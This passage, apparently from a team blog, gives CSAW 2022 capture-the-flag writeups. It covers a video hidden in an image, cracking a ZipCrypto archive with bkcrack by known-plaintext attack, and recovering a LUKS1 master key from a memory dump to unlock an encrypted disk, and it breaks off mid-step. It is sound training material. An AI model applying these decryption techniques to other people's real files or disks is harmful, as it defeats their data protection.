the quantum circuit\n    q = QuantumRegister(2, \"q\")\n    c = ClassicalRegister(2, \"c\")\n    \n    qc = QuantumCircuit(q,c)\n\n    #get the initial state from the output\n    vect0 = state_vect(output_array[i])\n    vect1 = state_vect(output_array[i+1])\n    \n    #initialize the register\n    qc.initialize(vect1,0)\n    qc.initialize(vect0,1)\n    \n    qc.measure(q, c)\n\n    #apply the CNOT gate, q[1] is the control and q[0] is the target\n    qc.cx(q[1],q[0])\n\n    qc.measure(q, c)\n    \n    #execute the circuit\n    qobj = assemble(qc, shots=1)\n    job = execute(qc,Aer.get_backend('qasm_simulator'),shots=1)\n    counts = job.result().get_counts()\n    \n    bin_flag += str(counts)[2:4]\n    \n    #Increment the counter to get the next 2 qubits\n    i=i+2\n    \nflag = ''.join(chr(int(bin_flag[i*8:i*8+8],2)) for i in range(len(bin_flag)//8))\nprint(flag)\n```\nThe flag is `flag{4_qu4ntum_g4t3}`\n\n","source":"_posts/Writeups/csaw2022.md","raw":"---\ntitle: CSAW'2022 Forensics Writeup\ndate: 2022-09-12 11:33:37\ntags:\ncover: https://imgur.com/ys2CFN6.png\ncategories:\n- [Writeups]\n---\n\nCSAW CTF is one of the oldest and biggest CTFs in the world, with more than 900 teams participating in the 2022 edition. We would like to thank the organizers for the stable infrastructure and the creative challenges.\n\nwe finished first in the MENA region and 14th globally\n\nKudos to everyone in my team SOter14 for their huge work and efforts, you can catch up with out latest news at [our website](https://soter14.tech) and [twitter page](https://twitter.com/SOter14Team)\n\nThe contest was fun and challenging, we managed to solve 25 out of the 28 challenges in Pwn, Web, OSINT, Forensics, Steganography, Misc, Quantum Computing, AI, Cryptography, and Reverse Engineering.\n\nBelow are the writeups for forensics challs: Noir, Not Too Taxing (Crypto), and Encrypted disk.\n\n# Noir: Digital Forensics / Steganography\n+++info Description\nI am a forest, and a night of dark trees: but he who is not afraid of my darkness, will find banks full of roses under my cypresses. Friedrich Nietzsche.\n\nThe image contains a flag in the format (flag)this_is_the_flag\n+++\n\nChallenge Link & Author\n\n{% links %}\n- site: Challenge Link \n  url: https://drive.google.com/file/d/1BudamndgM6TioyzVXicMKVDjA2F-KUPz/view?usp=sharing\n  desc: CSAW 2022 - Noir\n  image: https://ctftime.org/media/events/logo_48.png\n  color: \"#2296fd\"\n- site: Author - Wen Jun L.\n  desc: Wen Jun L. Linkedin Profile\n  url: https://www.linkedin.com/in/wenjl/\n  image: https://media-exp1.licdn.com/dms/image/C5603AQGZdulNxGshvg/profile-displayphoto-shrink_400_400/0/1602081502952?e=1668643200&v=beta&t=XeXg__QTpf__BhQHFkZD7sSsL7PeCEbEXdi-J66JfeU\n  color: \"#de2336\"\n{% endlinks %}\n\nThis challenge blowed our minds, it was part of CSAW'21 Finals and it is a 0-solves chall, so it was offered in the Quals of 2022. We've got an image, bit heavy around 9 MB that looks like a scene from a horror game, storm, forest, and darkness. It was a twisted chall!\n\n![](https://github.com/u91o/noir/blob/main/noir.png?raw=true)\n\nFirst, we tried the normal steganogrpahy ways around it, but obviously that is a total waster of time.\n\nIt had 100+ on Aperisolve alone!\n\nTechnically, the image is merely noise in the three RGB channels whith contrast on few areas, that when included with the alpha channel gives the image as you see it! Amazing, it really feels like some streaming technique, a kind of standard that's used by TVs to show pictures we can understand. But we neglected the thought of getting a video out of an image, how unfair! Instead we've thought of the noise as a raw data that we can feed to Audacity and hopefully get an audible thing out of it, using U-LAW since we're dealing with RAW data, it made much sense, because we have seen some images filled with noise turning into audio. But a video, insane!\n\n![](https://i.imgur.com/dpalAg1.png)\n\nAnd of course, it was a video!\n\nNoir represents a kind of movies, black and white, crime generally, and that's how we finally went into the idea that we're dealing with a video rather than an audio.\n\nThe Noir movies are taped to a stripe and played through a wheel showing still images 24 frames a second - Oh, keep that in mind! Still images mean also RAW data. That could help.\n\nBut still we wonder, how to extract the video.\nWell it can't be manually, there must be a tool, or it would be a total nightmare.\n\nTo save you some time, it was `FFmpeg`!!\n\nFFmpeg is a free and open-source software project consisting of a suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the command-line ffmpeg tool itself, designed for processing of audiovisual files. Per Wikipedia.\n\nWell, that means some sort of conversion, right? Yep, but from a single png to what? There are hundreds of video formats out there, some of them are no longer being used.\n\nBut we can narrow our results, to lightweight ones since the image is just 9 MB, 24 fps if that helps, RAW data, so no codecs!\n\nFFmpeg command to convert formats is basically:\n\n```bash ffmpeg command\nffmpeg -i source -pix_fmt pixelformat  -f rawvideo - > output.extension\n```\n\nYou can specify the frames, although ffmpeg can pretty much detect that automatically.\n\nWe need the pixelformat and the extension. We're getting close!\n\nHmm, since we're dealing with an image, can't the extension of the video we're looking for be both an image extension and a video extension. WEBM answers that. How clever!\n\nWebm is actually the only extension we've found thats a Joker, can be an image/audio/video. Which makes it special. That's it, by luck, we got it, WEBM.\n\nHowever we tried a lot of extenison, it was a game of trial and error, for instance we checked mp4, wmv, avi, mkv, flv, mov, you name it...\n\nFFmpeg needs a pixel format, well, there is a hude table of these formats...\n``` bash pixels format\nname=     yuv420p, nb_channels=   3, depth=   8, is_alpha=n\nname=     yuyv422, nb_channels=   1, depth=   8, is_alpha=n\nname=       rgb24, nb_channels=   3, depth=   8, is_alpha=n\nname=       bgr24, nb_channels=   3, depth=   8, is_alpha=n\nname=     yuv422p, nb_channels=   3, depth=   8, is_alpha=n\nname=     yuv444p, nb_channels=   3, depth=   8, is_alpha=n\nname=       rgb32, nb_channels=   4, depth=   8, is_alpha=y\nname=     yuv410p, nb_channels=   3, depth=   8, is_alpha=n\nname=     yuv411p, nb_channels=   3, depth=   8, is_alpha=n\nname=      rgb565, nb_channels=   3, depth=   5, is_alpha=n\nname=      rgb555, nb_channels=   3, depth=   5, is_alpha=n\nname=        gray, nb_channels=   1, depth=   8, is_alpha=n\nname=       monow, nb_channels=   1, depth=   1, is_alpha=n\nname=       monob, nb_channels=   1, depth=   1, is_alpha=n\nname=        pal8, nb_channels=   4, depth=   8, is_alpha=y\nname=    yuvj420p, nb_channels=   3, depth=   8, is_alpha=n\nname=    yuvj422p, nb_channels=   3, depth=   8, is_alpha=n\nname=    yuvj444p, nb_channels=   3, depth=   8, is_alpha=n\nname=      xvmcmc, nb_channels=   0, depth=   0, is_alpha=n\nname=    xvmcidct, nb_channels=   0, depth=   0, is_alpha=n\nname=     uyvy422, nb_channels=   1, depth=   8, is_alpha=n\nname=   uyyvyy411, nb_channels=   1, depth=   8, is_alpha=n\nname=       bgr32, nb_channels=   4, depth=   8, is_alpha=y\nname=      bgr565, nb_channels=   3, depth=   5, is_alpha=n\nname=      bgr555, nb_channels=   3, depth=   5, is_alpha=n\nname=        bgr8, nb_channels=   1, depth=   8, is_alpha=n\nname=        bgr4, nb_channels=   1, depth=   4, is_alpha=n\nname=   bgr4_byte, nb_channels=   1, depth=   8, is_alpha=n\nname=        rgb8, nb_channels=   1, depth=   8, is_alpha=n\nname=        rgb4, nb_channels=   1, depth=   4, is_alpha=n\nname=   rgb4_byte, nb_channels=   1, depth=   8, is_alpha=n\nname=        nv12, nb_channels=   2, depth=   8, is_alpha=n\nname=        nv12, nb_channels=   2, depth=   8, is_alpha=n\nname=     rgb32_1, nb_channels=   4, depth=   8, is_alpha=y\nname=     bgr32_1, nb_channels=   4, depth=   8, is_alpha=y\nname=    gray16be, nb_channels=   1, depth=  16, is_alpha=n\nname=    gray16le, nb_channels=   1, depth=  16, is_alpha=n\n```\n\nWell, we didn't guess, we, at this stage, after looking deeply into the image, and as said before, the RGB channels are carrying noise that surely represent the video, however the alpha channel is the one that shape the picture as we see it in the previews. So the pixel format we choose is rgb24 excluding the alpha channel.\n\nThe final command is:\n```bash Command Line\nffmpeg -i noir.png -pix_fmt rgb24  -f rawvideo - > vid.webm\n```\n\nCoool, after all the hustle we've got a video, a subway with blinking lights, or should I say, Morse Code!\nThe clock was ticking, we're at the final hours of the CTF, and the video is 2 mins long.\nCould there be any OpenCV tool for this! Of course, here is a link you might need it as well [MorseDecoder](https://github.com/Razer2015/MorseDecoder)\n\nHere is a link for the video as well [video.webm](https://drive.google.com/file/d/19NS92WnVY1IMlG4hyEYXvsE71j_m1Cpo/view?usp=sharing)\n\nUsing the tool, I let it record my screen and positioned the cross selection on the train lights. Within a minute we've got the flag!\n\n![](https://i.imgur.com/wh0uUv2.png)\n\nFinally, it was a creative challenge we must say!\n\nThe flag is `(flag)sil3nt_refl3ct1on`\n\n# Not Too Taxing: Digital Forensics / Cryptography\n\n+++info Description\nWe intercepted some email communications between a tax consultant and his client that contained some important tax documents. We were able to successfully extract two of the documents, but we can't figure out the password to the file in order to extract the data. Attached are the two extracted files, Tax_Ret_Form_Blank.pdf and Tax_Ret_Form_Nov_2021.zip, and a transcript of the emails we found, SPBlock_Email.pdf.\n\nCan you figure out the password so we can get this guy's info?\n+++\n\nChallenge Link & Author\n\n{% links %}\n- site: Challenge Link \n  url: https://drive.google.com/drive/folders/1z5HlXGYaVxmNwVmxdDXFBOOIAedKzsZM?usp=sharing\n  desc: CSAW 2022 - Not Too Taxing\n  image: https://ctftime.org/media/events/logo_48.png\n  color: \"#2296fd\"\n- site: \n  desc: \n  url: \n  image: \n  color: \"#de2336\"\n{% endlinks %}\n\nIn this challenge we were given, an encrypted zip archive containing a filled state tax form document for the month of Novemeber 2021, the emails transmitted between ... and the client, as well as the template of the tax form blank.\n\nWe've noticed the zip was using the ZipCrypto Store compression, which is breakable if you can find 12 bytes of the data inside the zip, 8 of which got to be contiguous.\n\nZipCrypto is considered as the legacy encryption of archives, you must be aware that it is the default method used in most Linux distros: ZipCrypto Deflate. Thus you might want to manually change that method when compressing to AES for higher security.\n\nThe ZipCrypto algorithm generates a pseudo-random stream of bytes/keystream, which is XORed to the entry's content. to produce the encrypted data. The generator's state made of three 32-bits integers (keys), is initialized using the password and then contiuously updating as encryption goes on.\n\nThis encryption algorithm is vulnerable to known plaintext attacks to recover the content fully.\n\nWe're going to use `bkcrack` tool which can recover the content of the archive, change a zip archive's password, and recover the original password. All by retrieving the zip archive three generated keys.\n\nThe installation is pretty straight forward, just git clone the repo then,\n\n```bash Command Line \ncmake -S . -B build -DCMAKE_INSTALL_PREFIX=install\ncmake --build build --config Release\ncmake --build build --config Release --target install\n```\n\nWell, we must use the blank tax form as our plaintext attack, as it shares a lot of identical bytes with the filled form inside the zip.\n\nHowever you can't just feed the pdf to bkcrack and hope for it to crack the zip. The tool requires a non encrypted zip with the similar bytes inside to attack the encrypted zip.\n\nSo let's get our blank form inside a zip and specify the method of encryption as ZipCrypto and the compression level as store. Now we guarantee there are plenty of similar bytes to execute the attack.\n\n![](https://i.imgur.com/ouMza3O.png)\n\nFirst we retrieve the three keys from the zip archive using\n\n```bash Command Line\nbkcrack -C Tax_Ret_Form_Nov_2021.zip -c Tax_Ret_Form_Nov_2021.zip -P Tax_Ret_Blank.zip -p Tax_Ret_Form_Blank.pdf\n```\n\n-C: Specifies the encrypted zip archive\n-c: Specifies the target file within the archive\n-P: Specifies the plaintext zip archive\n-p: specifies the plaintext file within the non encrypted archive.\n\nNow let it process for a while, it should not take long, as we provided more than enough data to bkcrack.\n\nHere are they keys I have got:\n\n```bash result\nb2c4a24e f036ff3a 998f6727\n```\n\nIf the compression wasn't Store, and instead it was Deflate, then the Github repo provides some python scripts to decompress those types, just first include `-d deciphered` at the end of the previous command.\n\nThen run:\n\n```bash Command Line\npython3 tools/inflate.py deciphered decompressed\n```\n\nIn our case, it was just Store, so we move on to the next step, we're going to recreate the very same archive with a password of our choise, this is the fastest way around Zip crypto archives, you can go ahead and retrieve the password, we will show that. However that process will take a bit longer.\n\n```bahs command Line\nbkcrack -C Tax_Ret_Form_Nov_2021.zip -k b2c4a24e f036ff3a 998f6727 -U unlocked.zip 1234\n```\n\nAnd within a second, we got our new archive with the filled document restored successfully!\n\n![](https://i.imgur.com/8x38gOi.png)\n\nAnd the flag was: `flag{1f_y0u_u53_z1pcryp70_4ny0n3_c4n_aud17_y0u}`\n\nHowever if you want the hard way, you can retrieve the original password of the archive using the three keys, you might need to know the length though, or guess it. Tideous task...\n\nAnyways, here is the command you would use for that:\n\n```bash Command Line\nbkcrack -k b2c4a24e f036ff3a 998f6727 -r 8..12 ?p\n```\n\n-r to specify the length, it can be a rough number or an interval.\n\nSorry, I didnt bother to get the password :))\n\nIt was a creative challenge. However I must say that we did not check the email content document at all lol!\n\n\n# Encrypted Disk: Digital Forensics\n\n+++info Description\nth31nk encrypted his disk and forgot the password, can you help him? Flag is what you find, no need to wrap\n\nHINT: Custom Profile\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://drive.google.com/file/d/16tILpZa5GivY-Z84lrm86V8DC5DWaHza/view?usp=sharing\n  desc: CSAW 2022 - Encrytped Disk \n  image: https://ctftime.org/media/events/logo_48.png\n  color: \"#2296fd\"\n- site: Author - Crazyman\n  desc: Crazyman Twitter Profile\n  url: https://twitter.com/CrazymanArmy\n  image: https://pbs.twimg.com/profile_images/1427918895424282628/NR5jaECn_400x400.jpg\n  color: \"#de2336\"\n{% endlinks %}\n\nIn this challenge we got a disk image & a memory dump. The Description tell us that the user encrypted his disk and forgot the password! So we can understand that the memory dump will help us to decrypt the disk to get the flag! right?? Let's Check what we have !\n```bash Command Line Prompt \n4n6nk8s@csaw2022:~$ file *\nforensic.img: LUKS encrypted file, ver 1 [aes, ecb, sha1] UUID: 61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe\nmemory.raw:   data\n```\nAs you see we have LUKS encrypted file version1! I will say it again! it's verion 1!!! \nOh wait what is LUKS??! \n\nLUKS or the Linux Unified Key Setup is a disk encryption specification created by Clemens Fruhwirth in 2004 and was originally intended for Linux.\nWhile most disk encryption softwares implement different, incompatible, and undocumented formats, LUKS implements a platform-independent on-disk format for use in various tools. This not only faciliates compatibility and interoperability among different programs, but also assures that they all implement password management in a secure and documented manner. Per Wikipedia.\n\nUnlike most blogs say, you should stick with LUKS2 if you are applying it to your disk, since it provides an extra layer of security by storing the master key in the kernel directly. However LUKS1 masterkey gets loaded in the RAM when you try to unlock it, and that what we are going to grab from the memory dump!\n\nThe encrypted master key is stored as plaintext in the LUKS header. However once we mount it and get prompted to enter a passphrase, at least one of eight (LUKS support up to 8 passphrases), the decrypted master key (AES) is loaded into the memory.\n\n![](https://i.imgur.com/GOTSIPB.png)\n*Image courtesy: MDPI*\n\nWhen we tried to use Volatility.py against the memory dump we had some troubles finding the right profile. \n\nWe are sure that this memory image is linux one, because we have LUKS. Let's figure out what is the distrubition and the version to search or make our volatility profile to work with! \n\n```bash Command Line Prompt \n4n6nk8s@csaw2022:~$ strings memory.ram | grep \"Linux version\"\nLinux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)\n```\nOh it's [Ubuntu 16.04.4]{.pinky} with low-latency kernel! oh wait what? what did you mean by low-latency kernel?\nAs I know there is various type of linux kernel like Real-tim kernel, generic kernel, Low-latency kernel \nThis types of kernel varies in the type of the scheduler and their algorithm, as well as the system interuption... etc! None is better than the other! Each one has its use case.\n\nFor example the low-latency one can reduce audio latency and the context switches are more frequent. This type of kernel has a scheduler that is not suitable for a server environment! But it will be good for a professional audio or video editing!\n\nOk now i guess you get it ! It's time to make our profile! In this demo we will make a volatility profile with low-latency kernel using docker container. It's better than downloading a whole VM! Don't waste time in that! \n\nLet's download volatiltiy man\n```bash Command Line Prompt \n4n6nk8s@csaw2022:~$ git clone https://github.com/volatilityfoundation/volatility\nCloning into 'volatility'...\nremote: Enumerating objects: 27411, done.\nCceiving objects:   7% (1919/27411), 340.01 KiB | 652.00 KiB/s\n```\nIn Volatility repository there is `/tools/linux` directory that contains tools that allow us to make a linux profile. In this directory there is a file called [Makefile]{.pinky} that contains important information ! Let's check it! \n```bash Command Line Prompt\n4n6nk8s@csaw2022:~volatility/tools/linux/$ cat Makefile\nobj-m += module.o\nKDIR ?= /\nKVER ?= $(shell uname -r)\n\n-include version.mk\n\nall: dwarf\n\ndwarf: module.c\n        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build CONFIG_DEBUG_INFO=y M=\"$(PWD)\" modules\n        dwarfdump -di module.ko > module.dwarf\n        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=\"$(PWD)\" clean\n\nclean:\n        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=\"$(PWD)\" clean\n        rm -f module.dwarf\n```\nLook at the `KVER` variable , it contains your current kernel version! it's an automatic kernel detection! in our case we will change it with the version of kernel that we will use it! Check the Linux Version from the output of the last strings command that we runed on the memory dump.\nchange `$(shell uname -r)` with `4.4.0-72-lowlatency`. Do it manually or use the magic of `sed` command\n\n```bash Sed Magic\n4n6nk8s@csaw2022:~volatility/tools/linux/$ sed -i 's/$(shell uname -r)/4.4.0-72-lowlatency/g' Makefile\n```\n\nNow it's time to run a [Ubuntu 16.04.4]{.pinky} docker container and mount the current direcotry that contains the tools to build the profile. We can use the variable environment $PWD to indicate the current path easly. Don't waste your time writing the whole path man ! \n```bash Command Line Prompt\nsudo docker run -it --rm -v $PWD:/volatility ubuntu:16.04 /bin/bash\nUnable to find image 'ubuntu:16.04' locally\n16.04: Pulling from library/ubuntu\n58690f9b18fc: Downloading [=========>                                         ]  8.522MB/46.5MB\nb51569e7c507: Download complete\nda8ef40b9eca: Download complete\n```\nJust wait until the container is pulled & get your bash !\n```bash The ubuntu container is ready \nDigest: sha256:91bd29a464fdabfcf44e29e1f2a5f213c6dfa750b6290e40dd6998ac79da3c41\nStatus: Downloaded newer image for ubuntu:16.04\nroot@507b1a4007ff:/#\n```\nSince our ubuntu container is ready to use. Let's install the low-latency kernel and the essentials packages for building the profile.\n```bash Install our packages \nroot@507b1a4007ff:/# apt update && apt install -y linux-image-4.4.0-72-lowlatency linux-headers-4.4.0-72-lowlatency build-essential dwarfdump make zip\nGet:1 http://security.ubuntu.com/ubuntu xenial-security InRelease [99.8 kB]\nGet:2 http://archive.ubuntu.com/ubuntu xenial InRelease [247 kB]\nGet:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 Packages [2051 kB]\nGet:4 http://archive.ubuntu.com/ubuntu xenial-updates InRelease [99.8 kB]\nGet:5 http://archive.ubuntu.com/ubuntu xenial-backports InRelease [97.4 kB]\nGet:6 http://archive.ubuntu.com/ubuntu xenial/main amd64 Packages [1558 kB]\nGet:7 http://security.ubuntu.com/ubuntu xenial-security/restricted amd64 Packages [15.9 kB]\n```\nAh man you'll wait again until the installation is done! After the installation is finished let's check our volatility tools inside the container then make the profile !\n```bash Make The profile \nroot@507b1a4007ff:/# ls\nbin   dev  home        lib    media  opt   root  sbin  sys  usr  vmlinuz\nboot  etc  initrd.img  lib64  mnt    proc  run   srv   tmp  var  volatility\n\nroot@507b1a4007ff:/# cd volatility/\n\nroot@507b1a4007ff:/volatility# ls\nMakefile  Makefile.enterprise  kcore  module.c\n\nroot@507b1a4007ff:/volatility# make\nmake -C //lib/modules/4.4.0-72-lowlatency/build CONFIG_DEBUG_INFO=y M=\"/volatility\" modules\nmake[1]: Entering directory '/usr/src/linux-headers-4.4.0-72-lowlatency'\n  CC [M]  /volatility/module.o\n  Building modules, stage 2.\n  MODPOST 1 modules\n  CC      /volatility/module.mod.o\n  LD [M]  /volatility/module.ko\nmake[1]: Leaving directory '/usr/src/linux-headers-4.4.0-72-lowlatency'\ndwarfdump -di module.ko > module.dwarf\nmake -C //lib/modules/4.4.0-72-lowlatency/build M=\"/volatility\" clean\nmake[1]: Entering directory '/usr/src/linux-headers-4.4.0-72-lowlatency'\n  CLEAN   /volatility/.tmp_versions\n  CLEAN   /volatility/Module.symvers\nmake[1]: Leaving directory '/usr/src/linux-headers-4.4.0-72-lowlatency'\n```\nNow let's zip the result of the make command (module.dwarf) and the system map file from the `/boot` :\n\n* The system map file contains the Symbols that will be used by volatility to run the plugin correctly. It list function entry points and addresses of kernel data structures of a particular build of a kernel!\n\n* The `module.dwarf` contains the `vtypes` of this kernel module! To make we can call `vtypes` as the kernel's data structures. To make it more easy `vtypes` is a small library to define `Validating Types` that will be used by the kernel ! \n\nWhy we zip the `module.dwarf` and the `System.map` file? It's simple man! These two files represent the whole profile that will be used by volatility! Volatility requires these 2 files to be in zip to deal with it as profile! Wow man, our profile is coming!\n\nzip Ubuntu1604.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency\n\n```bash Zip the 2 files\nroot@507b1a4007ff:/volatility# zip Ubuntu1604-low.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency\n  adding: module.dwarf (deflated 89%)\n  adding: boot/System.map-4.4.0-72-lowlatency (deflated 79%)\n```\nNow just leave our ubuntu container. we finished the 1st step of the challenge and you learn how to make a cool & custom linux profile! Now you can copy this zip file to `/plugins/overlays/linux/` directory in your volatility environment.\n\nSanity Check please ! Let's list all the ubuntu profiles available!\n\n```bash check the availability of the profile\n4n6nk8s@csaw2022:~$ vol.py --info | grep -i ubuntu \nVolatility Foundation Volatility Framework 2.6.1\nLinuxUbuntu1604-lowx64     - A Profile for Linux Ubuntu1604-low x64\n```\nCool! we found our new profile recognized by volatility ! Now it's time to try use it.\n```bash Test the new profile\n4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_banner    \nVolatility Foundation Volatility Framework 2.6.1\nLinux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)\n```\nBingo!! Our profile is ready to work! Let's start the investigation now\nI started checking the bash history!\n```bash Bash History\nvol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_bash        \nVolatility Foundation Volatility Framework 2.6.1\nPid      Name       Command Time             Command\n-------- ---------- -----------------------  -------\n    1229 bash       2017-04-14 07:58:36 UTC  history\n    1229 bash       2017-04-14 07:58:36 UTC  apt-get install linux-image-4.4.0-72-lowlatency linux-headers-lowlatency\n    1229 bash       2017-04-14 07:58:36 UTC  reboot\n    1229 bash       2017-04-14 07:58:36 UTC  apt-get insta\n    1229 bash       2017-04-14 07:59:07 UTC  history\n    1229 bash       2017-05-05 12:04:44 UTC  apt-get install lynx gnupg\n    1229 bash       2017-05-05 12:06:54 UTC  nano /etc/fstab\n    1229 bash       2017-05-05 12:06:58 UTC  nano /etc/crypttab\n    1229 bash       2017-05-05 12:07:08 UTC  cd /mnt/\n    1229 bash       2017-05-05 12:07:29 UTC  cp -R /media/sf_DUMP/dir* .\n    1229 bash       2017-05-05 12:07:38 UTC  ping 8.8.8.8\n    1229 bash       2017-05-05 12:09:14 UTC  gpg --quick-gen-key 'Troll <abuse@nothere.com>' rsa4096 cert 1y\n    1229 bash       2017-05-05 12:09:49 UTC  lynx -accept_all_cookies \"https://www.google.com/?=password+porno+collection\"\n    1229 bash       2017-05-05 12:10:27 UTC  gpg --yes --batch --passphrase=1m_4n_4dul7_n0w -c findme.txt\n    1229 bash       2017-05-05 12:10:37 UTC  lynx -accept_all_cookies \"https://www.google.com/?=password+troll+memes\"\n    1229 bash       2017-05-05 12:11:04 UTC  gpg --yes --batch --passphrase=Troll_Tr0ll_TrOll -c end.zip\n    1229 bash       2017-05-05 12:11:20 UTC  nano dir1/dic_fr_l33t.txt\n    1229 bash       2017-05-05 12:11:28 UTC  rm findme.txt\n    1229 bash       2017-05-05 12:11:35 UTC  rm -rf dir1/\n    1229 bash       2017-05-05 12:11:55 UTC  dd if=/dev/sdb of=/media/sf_DUMP/forensic.img bs=2048\n```\nLet's analyse this history together to understand what is going on here! \n* The user install low-latency kernel \n* install lynx : a terminal-based web browser for all Linux distributions\n* edit the /etc/fstab.\n* edit /etc/crypttab \n* copy the directories from media (it can be a flash) partition to `/mnt/`\n* Check the connectivity by pinging the DNS server of google (I used to do the same test :3)\n* generate a key with gpg using rsa4096. Something will be encrypted in the next commands! I am sure\n* use lynx to search for porno password collection! mmm He want a premium account \n* Encrypt `findme.txt` file using gpg !! This will generate an encrypted file `findme.txt.gpg`\n* Search for troll password! \n* Encrypt `end.zip` with gpg again! We have `end.zip.gpg`, another encrypted file! \n* edit a file text called `dic_fr_l33t.txt`\n* remove `findme.txt`. I guess we need to recover this file ! \n* remove the directory that contains the `dic_fr_l33t.txt` file \n\n> /etc/fstab: is a configuration table designed to ease the burden of mounting and unmounting file systems to a machine. It is a set of rules used to control how different filesystems are treated each time they are introduced to a system\n\n> The /etc/crypttab (encrypted device table) file is similar to the fstab file and contains a list of encrypted devices to be unlocked during system boot up. This file can be used for automatically mounting encrypted swap devices or secondary file systems.\n\nOk the encrypted disk contains a `end.zip.gpg` and `findme.text.gpg`. These 2 files are the key of the task! The flag is on these files! So we need to decrypt to disk and mount it!\n\n## Decrypt Disk and MOUNT IT \n\nDealing with the disk we require `cryptsetup` --a tool to manage plain dm-crypt and LUKS encrypted volumes, to install it, use `sudo apt install cryptsetup-bin`.\n\nAnalyzing the disk image to understand what we need to next!\n\ncommand `cryptsetup luksDump forensic.img` will return some useful LUKS information:\n\n```bash LUKS INFO\nLUKS header information for forensic.img\n\nVersion:        1\nCipher name:    aes\nCipher mode:    ecb\nHash spec:      sha1\nPayload offset: 2048\nMK bits:        128\nMK digest:      a0 0c 4d c4 4a 53 5c 00 0c c3 33 63 13 5b 2c 41 8e a3 3f a9\nMK salt:        5e 84 10 01 a8 19 06 22 6a 7b 1b df 35 73 46 8e\n                0e 7e f4 68 b0 97 38 81 cf 6d 99 7c 22 82 bd 06\nMK iterations:  117625\nUUID:           61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe\n\nKey Slot 0: ENABLED\n        Iterations:             507935\n        Salt:                   68 5e 9a ef 39 26 3a 09 3a a2 57 fa b8 a4 d9 6b\n                                65 81 49 63 d7 43 41 2a 0e 0a cd cb d7 94 ac 01\n        Key material offset:    8\n        AF stripes:             4000\nKey Slot 1: DISABLED\nKey Slot 2: DISABLED\nKey Slot 3: DISABLED\nKey Slot 4: DISABLED\nKey Slot 5: DISABLED\nKey Slot 6: DISABLED\nKey Slot 7: DISABLED\n```\n\nIt is clear as day that once we have the master key --the one used to control the disk the way we want, we can add a key slot/passphrase.\n\nAs said in the introduction, the master key must be loaded into the RAM, we know it is AES, so using `findaes` tool [here](https://sourceforge.net/projects/findaes/)\n\nThen, extract the downloaded zip file\n`unzip findaes*.zip`\nCompile it\n`cd findaes* ; make`\nAnd run it against the memory dump\n`./findaes memory.raw`\nAnd you get this!\n```bash AES Finally ! \nFound AES-128 key schedule at offset 0xad9f450:\n8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1\n```\n\nGoing further is a routinuous disk encryption operation, with the masterkey in hand, we can generate a new passphrase say `1234` or `p@ssw0rd` for us to access the content.\n\n``` bash MasterKey !\necho -n \"8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1\" | tr -d \" \" | xxd -r -p  > masterkey.key\n\ncryptsetup luksAddKey --master-key-file=masterkey.key forensic.img                               \nEnter new passphrase for key slot:\nVerify passphrase:\n```\n\nLet's see if it is now placed as Key Slot 1!\n\n```bash LUKS \ncryptsetup luksDump forensic.img | grep Key.Slot\nKey Slot 0: ENABLED\nKey Slot 1: ENABLED\nKey Slot 2: DISABLED\nKey Slot 3: DISABLED\nKey Slot 4: DISABLED\nKey Slot 5: DISABLED\nKey Slot 6: DISABLED\nKey Slot 7: DISABLED\n```\n\nAll good!\nNow, we mount it!\n\n```\nsudo cryptosetup luksOpen forensic.img mydata\nEnter passphrase for forensic.img: \nmkdir ~/csaw\nsudo mount /dev/mapper/mydata ~/csaw\n```\n\nJust fill in your new passphrase in the previous step, and you'll have it!\n\nIf you got some permission concern while trying to access the mount point, just switch to root!\n\nAfter decrypting the disk and mounting it! We find 2 directories! `dir2` and `lost+found`. OK I can say skip & ignore `lost+found` directory. The `dir2` is our target. Let's get our flag man! \n\n```bash test\n4n6nk8s@csaw2022:~/csaw/dir2$ ls \nend.png    findme.txt.gpg      readme.txt\n```\nLet's check the readme.txt first, Just i am trying to be patient before attacking the `findme.txt.gpg`\n```bash Check readme\n4n6nk8s@csaw2022:~/csaw/dir2$ cat readme.txt\nDo you know GPG? So just do it to decipher!!!\n```\nAh man! We know that! We need to decrypt the gpg files. But wait! where is the `end.zip.gpg` file! \nOk it's not important for me! I guess `findme.txt.gpg` is the flag! Let's decipher it with `gpg` command line utility. Of course we will use `1m_4n_4dul7_n0w` password! \n\n\n```bash test\n4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output findme.txt --decrypt findme.txt.gpg # it will ask you for a password\n4n6nk8s@csaw2022:~/csaw/dir2$ cat findme.txt\nThe flag is not here of course !!!\nYou must find it :-)\nTroll one day troll always ........\n```\nAh man ! I don't find the flag! OK still the `end.zip.gpg`! Let's find this, i guess it's hiding in `end.png` image \n```bash Investigate end.png \n4n6nk8s@csaw2022:~/csaw/dir2$ sudo binwalk end.png \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 850 x 300, 8-bit/color RGB, non-interlaced\n320           0x140           Zlib compressed data, best compression\n917           0x395           Zlib compressed data, best compression\n493886        0x7893E         Zip archive data, at least v2.0 to extract, compressed size: 61917, uncompressed size: 61907, name: end.zip.gpg\n555953        0x87BB1         End of Zip archive, footer length: 22\n```\nFinally we found it, let's use `foremost` command to extract our target ! \n\n```bash Investigate end.png 